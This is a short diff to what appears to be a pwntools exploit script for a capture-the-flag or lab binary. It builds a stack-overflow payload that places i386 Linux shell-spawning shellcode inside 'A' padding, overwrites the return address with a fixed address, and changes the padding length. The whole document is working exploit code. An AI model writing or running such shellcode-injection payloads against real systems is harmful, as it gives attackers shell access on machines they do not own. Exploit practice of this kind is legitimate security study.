@@ -1,7 +1,7 @@
 from pwn import *
 shellcode = asm(shellcraft.i386.linux.sh())
 overflow_len = 0x308
-padding = 0x20
+padding = 0x50
 
 payload = ("A" * (overflow_len - len(shellcode) - padding)) + shellcode + "A"*padding + p32(0x8048615) * 3
 print hex(len(payload))
